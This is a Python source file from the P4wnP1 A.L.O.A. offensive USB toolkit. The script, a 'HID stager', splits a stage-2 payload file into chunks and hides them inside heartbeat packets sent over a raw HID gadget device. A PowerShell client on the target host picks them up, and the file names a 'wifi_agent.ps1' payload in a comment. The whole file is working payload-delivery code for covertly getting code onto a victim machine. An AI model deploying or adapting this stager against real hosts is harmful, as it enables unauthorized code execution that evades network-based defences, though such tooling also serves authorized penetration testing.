#!/usr/bin/python


#    This file is part of P4wnP1 A.L.O.A.
#
#    Copyright (c) 2018, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1 A.L.O.A.  If not, see <http://www.gnu.org/licenses/>.


import sys
import struct
import Queue
import getopt



chunks = lambda A, chunksize=60: [A[i:i+chunksize] for i in range(0, len(A), chunksize)]

# single packet for a data stream to send
# 0:	1 Byte 		src
# 1:	1 Byte 		dst
# 2:	1 Byte 		snd
# 3:	1 Byte 		rcv
# 4-63	60 Bytes	Payload

# reassemable received and enqueue report fragments into full streams (separated by dst/src)
def fragment_rcvd(qin, fragemnt_assembler, src=0, dst=0, data=""):
	stream_id = (src, dst)
	# if src == dst == 0, ignore (heartbeat)
	if (src != 0 or dst !=0):
		# check if stream already present
		if fragment_assembler.has_key(stream_id):
			# check if closing fragment (snd length = 0)
			if (len(data) == 0):
				# end of stream - add to input queue
				stream = [src, dst, fragment_assembler[stream_id][2]]
				qin.put(stream)
				# delete from fragment_assembler
				del fragment_assembler[stream_id]
			else:
				# append data to stream
				fragment_assembler[stream_id][2] += data
				#print repr(fragment_assembler[stream_id][2])
		else:
			# start stream, if not existing
			data_arr = [src, dst, data]
			fragment_assembler[stream_id] = data_arr

def send_packet(f, src=1, dst=1, data="", rcv=0):
	snd = len(data)
	#print "Send size: " + str(snd)
	packet = struct.pack('!BBBB60s', src, dst, snd, rcv, data)
	#print packet.encode("hex")
	f.write(packet)
		
def read_packet(f):
	hidin = f.read(0x40)
        #print "Input received (" + str(len(hidin)) + " bytes):"
        #print hidin.encode("hex")
	data = struct.unpack('!BBBB60s', hidin)
	src = data[0]
	dst = data[1]
	snd = data[2]
	rcv = data[3]
	# reduce msg to real size
	msg = data[4][0:snd]
	return [src, dst, snd, rcv, msg]
	
def deliverStage2(hidDevPath, stage2Data, oneshot):
	# main code
	qout = Queue.Queue()
	qin = Queue.Queue()
	fragment_assembler = {}

	
	# pack stage2 into otherwise empty heartbeat chunks	
	stage2_chunks = chunks(stage2Data)
	heartbeat_content = []
	heartbeat_content += ["begin_heartbeat"]
	heartbeat_content += stage2_chunks
	heartbeat_content += ["end_heartbeat"]
	heartbeat_counter = 0

	with open(hidDevPath,"r+b") as f:

		while True:
			packet = read_packet(f)
			src = packet[0]
			dst = packet[1]
			snd = packet[2]
			rcv = packet[3]
			msg = packet[4]

			
			
			fragment_rcvd(qin, fragment_assembler, src, dst, msg)
			if qout.empty():
				# empty keep alive (rcv field filled)
				#send_packet(f=f, src=0, dst=0, data="", rcv=snd)
				# as the content "keep alive" packets (src=0, dst=0) is ignored
				# by the PowerShell client, we use them to carry the initial payload
				# in an endless loop
				if heartbeat_counter == 0:
					print "Start new stage2 delivery"
				if heartbeat_counter == len(heartbeat_content):
					heartbeat_counter = 0
				send_packet(f=f, src=0, dst=0, data=heartbeat_content[heartbeat_counter], rcv=snd)
				if heartbeat_counter == len(heartbeat_content)-1:
					print "Ended stage2 delivery"
					if oneshot:
						# if oneshot is enabled, return after delivery
						return
				heartbeat_counter += 1
			else:
				packet = qout.get()
				send_packet(f=f, src=packet[0], dst=packet[1], data=packet[2], rcv=snd)


def main(argv):
	inputfile = ''
	outputfile = ''
	oneshot = False
	try:
		opts, args = getopt.getopt(argv,"shi:o:",["infile=","out="])
	except getopt.GetoptError:
		print 'hidstager.py -i <inputfile> -o <outputfile> [-s]'
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print 'hidstager.py -i <inputfile> -o <outputfile> [-s]'
			sys.exit()
		elif opt in ("-i", "--infile"):
			inputfile = arg
		elif opt in ("-o", "--out"):
			outputfile = arg
		elif opt == "-s": # single delivery
			oneshot=True
			
	if len(inputfile) == 0 or len(outputfile) == 0:
		print 'Input (stage2 data) and output (raw HID device) have to be given!'
		sys.exit(2)
		
	print 'Delivering "', inputfile, '" via raw HID device "', outputfile, '"'
	if oneshot:
		print 'Exit after first delivery'
   
	# Initialize stage one payload, carried with heartbeat package in endless loop
	#with open("wifi_agent.ps1","rb") as f:
	with open(inputfile,"rb") as f:
		stage2=f.read()

	#deliverStage2("/dev/hidg2", stage2)	
	deliverStage2(outputfile, stage2, oneshot)	


if __name__ == "__main__":
   main(sys.argv[1:])